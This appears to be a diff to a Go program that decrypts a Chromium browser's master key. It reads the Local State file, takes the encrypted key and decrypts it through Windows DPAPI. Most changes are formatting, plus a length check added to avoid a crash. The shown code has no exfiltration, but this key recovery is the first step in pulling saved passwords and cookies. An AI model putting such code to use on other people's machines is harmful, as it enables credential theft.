@@ -7,17 +7,18 @@ import (
 	"encoding/json"
 	"errors"
 	"os"
-	"unsafe"
 	"syscall"
+	"unsafe"
 )
 
-///////////////////////////// Custom DPAPI Implementation /////////////////////////////////
+// /////////////////////////// Custom DPAPI Implementation /////////////////////////////////
 var (
-	dllcrypt32   = syscall.NewLazyDLL("Crypt32.dll")
-	dllkernel32  = syscall.NewLazyDLL("Kernel32.dll")
-	pdd          = dllcrypt32.NewProc("CryptUnprotectData")
-	pll          = dllkernel32.NewProc("LocalFree")
+	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
+	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
+	pdd         = dllcrypt32.NewProc("CryptUnprotectData")
+	pll         = dllkernel32.NewProc("LocalFree")
 )
+
 type DATA_BLOB struct {
 	cbData uint32
 	pbData *byte
@@ -48,6 +49,7 @@ func DecryptWithDPAPI(data []byte) ([]byte, error) {
 	defer pll.Call(uintptr(unsafe.Pointer(outblob.pbData)))
 	return outblob.ToByteArray(), nil
 }
+
 //////////////////////////////////////////////////////////////////////////////////////////////
 
 func GetMasterKey(path string) []byte {
@@ -62,6 +64,12 @@ func GetMasterKey(path string) []byte {
 	_ = json.Unmarshal(data, &LocalStateJson)
 
 	EncryptedSecretKey, _ := base64.StdEncoding.DecodeString(LocalStateJson.OsCrypt.EncryptedKey)
+
+	//check if we can even get the first 5 bytes and if we can't then just return nothing
+	//not sure what is causing this to error out but it's better to just return nothing than to crash
+	if len(EncryptedSecretKey) < 5 {
+		return nil
+	}
 
 	secretKey := EncryptedSecretKey[5:]
 	DecryptedSecretKey, _ := DecryptWithDPAPI(secretKey)
